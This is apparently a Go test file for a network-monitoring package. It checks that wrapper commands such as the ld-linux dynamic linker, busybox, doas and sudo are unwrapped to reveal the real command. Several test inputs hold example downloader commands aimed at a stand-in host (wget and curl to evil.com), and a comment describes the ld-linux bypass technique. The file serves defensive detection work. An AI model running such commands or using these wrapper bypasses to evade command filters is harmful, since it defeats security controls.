//go:build linux

package netmonitor

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestUnwrapTransparentCommand_LdLinux(t *testing.T) {
	// Realistic ld-linux bypass: directly invoking the dynamic linker with
	// the target binary. No --preload flags in the common attack scenario.
	cmd, args, depth := UnwrapTransparentCommand(
		"/lib64/ld-linux-x86-64.so.2",
		[]string{"ld-linux-x86-64.so.2", "/usr/bin/wget", "http://evil.com"},
		nil,
	)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"/usr/bin/wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_LdLinuxAarch64(t *testing.T) {
	cmd, _, depth := UnwrapTransparentCommand(
		"/lib/ld-linux-aarch64.so.1",
		[]string{"ld-linux-aarch64.so.1", "/usr/bin/curl", "http://evil.com"},
		nil,
	)
	assert.Equal(t, "curl", cmd)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_Busybox(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand(
		"/bin/busybox",
		[]string{"busybox", "wget", "http://evil.com"},
		nil,
	)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_Doas(t *testing.T) {
	// With simplified heuristic, -u is skipped but "root" is picked as payload.
	// This is safe: "root" won't match any command rule and hits default-deny.
	cmd, args, depth := UnwrapTransparentCommand(
		"/usr/bin/doas",
		[]string{"doas", "-u", "root", "wget", "http://evil.com"},
		nil,
	)
	assert.Equal(t, "root", cmd)
	assert.Equal(t, []string{"root", "wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestIsTransparentCommand_LinuxSpecific(t *testing.T) {
	tests := []struct {
		basename    string
		transparent bool
	}{
		{"ld-linux-x86-64.so.2", true},
		{"ld-linux-aarch64.so.1", true},
		{"ld-linux.so.2", true},
		{"busybox", true},
		{"doas", true},
		{"strace", true},
		{"ltrace", true},
	}
	for _, tt := range tests {
		t.Run(tt.basename, func(t *testing.T) {
			assert.Equal(t, tt.transparent, IsTransparentCommand(tt.basename, nil))
		})
	}
}

func TestUnwrapTransparentCommand_LdLinuxChained(t *testing.T) {
	// sudo ld-linux /usr/bin/wget
	cmd, args, depth := UnwrapTransparentCommand(
		"/usr/bin/sudo",
		[]string{"sudo", "/lib64/ld-linux-x86-64.so.2", "/usr/bin/wget", "http://evil.com"},
		nil,
	)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"/usr/bin/wget", "http://evil.com"}, args)
	assert.Equal(t, 2, depth) // sudo -> ld-linux -> wget
}
